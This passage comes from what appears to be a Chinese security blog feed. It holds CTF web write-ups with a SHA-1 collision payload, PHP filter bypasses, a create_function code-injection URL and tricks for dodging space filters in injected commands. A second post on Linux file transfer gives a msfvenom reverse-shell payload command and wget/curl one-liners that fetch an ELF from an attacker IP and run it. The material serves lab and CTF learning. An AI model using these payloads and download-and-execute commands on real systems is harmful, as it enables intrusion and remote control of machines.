class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//here is level 3</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;str.php&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array1&#x27;</span>];<br>    <span class="hljs-variable">$a2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array2&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a1</span> == <span class="hljs-variable">$a2</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;????&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level4</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;level 3 failed ...&quot;</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>绕过sha1就可以了</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">array<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span>&amp;array<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123153144642.png" alt="image-20240123153144642"></p><p>直接就过了</p><p>0x05</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//here is last level</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;str.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str</span>[<span class="hljs-string">&#x27;query&#x27;</span>] == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;give me a parameter&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="hljs-variable">$str</span>[<span class="hljs-string">&#x27;query&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;blacklist here&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NI_SA_&#x27;</span>] === <span class="hljs-string">&quot;txw4ever&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$level5</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;level 4 failed ...&quot;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先得绕过检查</p><blockquote><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123153835572.png" alt="image-20240123153835572"></p><p>或者构造一个不合理的url</p><blockquote><p><a href="http://1.14.71.254:28023///level_level_4.php?NI_SA_=txw4ever">http://1.14.71.254:28023///level_level_4.php?NI_SA_=txw4ever</a></p></blockquote><p>0x06</p><p>这个的话<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123154456727.png" alt="image-20240123154456727"></p><p>看到了<code>$a(&#39;&#39;,$b);</code></p><p>就可以思考构造一个create_function，但是又得过正则，所以直接取反</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node5.anna.nssctf.cn:<span class="hljs-number">28841</span><span class="hljs-regexp">/55_5_55.php?a=\create_function&amp;b=;&#125;system(&#x27;ls /</span><span class="hljs-string">&#x27;);/*</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123154802494.png" alt="image-20240123154802494"></p><p>然后get falg</p><h1 id="SWPUCTF-2022-新生赛-webdog1-start"><a href="#SWPUCTF-2022-新生赛-webdog1-start" class="headerlink" title="[SWPUCTF 2022 新生赛]webdog1__start"></a>[SWPUCTF 2022 新生赛]webdog1__start</h1><p>0x00</p><p>挺好玩的，也比较适合入门</p><p>利用的知识点</p><ul><li>php 弱比较</li><li>抓包</li><li>空格绕过</li></ul><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240204001834662.png" alt="image-20240204001834662"></p><p>这个只需要在源代码里面就可以发现</p><p>这个是弱比较，就是原来了等于md5加密的</p><p>可以使用0e绕过</p><blockquote><p>0e215962017</p></blockquote><p>0x02</p><p>常规的检测</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240204002037459.png" alt="image-20240204002037459"></p><p>看到请求头</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240204002058460.png" alt="image-20240204002058460"></p><p>直接访问</p><p>0x03</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240204002133172.png" alt="image-20240204002133172"></p><p>还是常规的信息收集</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240204002155612.png" alt="image-20240204002155612"></p><p>0x04</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240204002229962.png" alt="image-20240204002229962"></p><p>rce+空格绕过</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-symbol">&lt;1&gt;</span>$&#123;IFS&#125;，Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash <span class="hljs-keyword">shell</span>用户字段分隔符的一系列字符。默认情况下，bash <span class="hljs-keyword">shell</span>会将下面的字符当做字段分隔符：空格、制表符、换行符。<br><br><span class="hljs-symbol">&lt;2&gt;</span>$&#123;IFS&#125;$<span class="hljs-number">9</span>，#$<span class="hljs-number">9</span>可改成$加其他数字。<br><br><span class="hljs-symbol">&lt;3&gt;</span>&#123;<span class="hljs-keyword">cat</span>,flag.php&#125;，用,实现了空格；指令中的&#123;&#125;通配符，<span class="hljs-keyword">shell</span>会先把&#123;&#125;的内容按照解释方式翻译成一个或多个参数，再执行该含有多参数的指令。在Linux bash中可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令，如&#123;mv,文件<span class="hljs-number">1</span>，文件<span class="hljs-number">2</span>&#125;。<br><br><span class="hljs-symbol">&lt;4&gt;</span>&lt;，输入重定向，将一个文件的内容作为命令的输入。<br><br><span class="hljs-symbol">&lt;5&gt;</span>&lt;&gt;，重定向符<br><br><span class="hljs-symbol">&lt;6&gt;</span>%<span class="hljs-number">20</span>，URL传递<br><br><span class="hljs-symbol">&lt;7&gt;</span>%<span class="hljs-number">09</span>，URL传递<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240204002419804.png" alt="image-20240204002419804"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240204002513164.png" alt="image-20240204002513164"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240204002529147.png" alt="image-20240204002529147"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux文件传输</title>
    <link href="/2024/01/22/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"/>
    <url>/2024/01/22/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</url>
    
    <content type="html"><![CDATA[<h1 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h1><p>首先我们得生成一个linux下的可执行文件<code>.elf</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.79.138 <span class="hljs-attribute">lport</span>=9999 -f elf -o linux_64_9999.elf<br></code></pre></td></tr></table></figure><h1 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h1><p>下载指定的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget http://192.168.81.229/5555.elf -P /tmp/ &amp;&amp; chmod +x /tmp/5555.elf &amp;&amp; /tmp/5555.elf &amp;<br><br></code></pre></td></tr></table></figure><blockquote><p>-p 指定保存的文件地址</p><p>&amp; 放在后台</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122121813445.png" alt="image-20240122121813445"></p><p>指定文件名 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget -O 5555.elf http://192.168.81.229/5555.elf &amp;&amp; chmod +x 5555.elf &amp;&amp; ./5555.elf &amp;<br></code></pre></td></tr></table></figure><h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -o 5555.elf http://192.168.81.229/5555.elf &amp;&amp; chmod +x 5555.elf &amp;&amp; ./5555.elf &amp;<br>curl -O http://192.168.81.229/5555.elf &amp;&amp; chmod +x 5555.elf &amp;&amp; ./5555.elf &amp;<br></code></pre></td></tr></table></figure><h1 id="Netcat-x2F-nc"><a href="#Netcat-x2F-nc" class="headerlink" title="Netcat&#x2F;nc"></a>Netcat&#x2F;nc</h1><p>其实可以理解为流，将文件流存入网络流中，然后通过网络流又保存到本地文件</p><h2 id="受害者将网络流导入文件"><a href="#受害者将网络流导入文件" class="headerlink" title="受害者将网络流导入文件"></a>受害者将网络流导入文件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp 9999 &gt; linux.elf<br></code></pre></td></tr></table></figure><h2 id="攻击者将文件内容作为传输的内容"><a href="#攻击者将文件内容作为传输的内容" class="headerlink" title="攻击者将文件内容作为传输的内容"></a>攻击者将文件内容作为传输的内容</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat linux.elf | nc 受害者ip 受害者port <br></code></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122122835484.png" alt="image-20240122122835484"></p><h1 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">scp kali@192.168.79.138:/home/kali/linux_64_9999.elf  ~/linux2.elf<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122123141732.png" alt="image-20240122123141732"></p><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>使用攻击机上传文件</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp chg<span class="hljs-variable">@192</span>.<span class="hljs-number">168.79</span>.<span class="hljs-number">128</span><span class="hljs-symbol">:/home/chg/linux3</span>.elf linux_64_9999.elf <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122123607085.png" alt="image-20240122123607085"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122123629962.png" alt="image-20240122123629962"></p><h1 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h1><p>这个类似与scp</p><p>使用ssh服务传输文件</p><h2 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">sftp kali<span class="hljs-variable">@192</span>.<span class="hljs-number">168.79</span>.<span class="hljs-number">138</span><span class="hljs-symbol">:/home/kali/linux_64_9999</span>.elf  ~/linux2.elf<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122123220532.png" alt="image-20240122123220532"></p><h2 id="连接ftp服务器（攻击机）"><a href="#连接ftp服务器（攻击机）" class="headerlink" title="连接ftp服务器（攻击机）"></a>连接ftp服务器（攻击机）</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">sftp kali<span class="hljs-variable">@192</span>.<span class="hljs-number">168.79</span>.<span class="hljs-number">138</span><span class="hljs-symbol">:/var/www/html</span>      <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122123839430.png" alt="image-20240122123839430"></p><p>可以使用</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ls</span> 查看文件<br><span class="hljs-built_in">get</span> 下载文件<br><span class="hljs-keyword">help</span> 帮助<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122124004545.png" alt="image-20240122124004545"></p><p><img 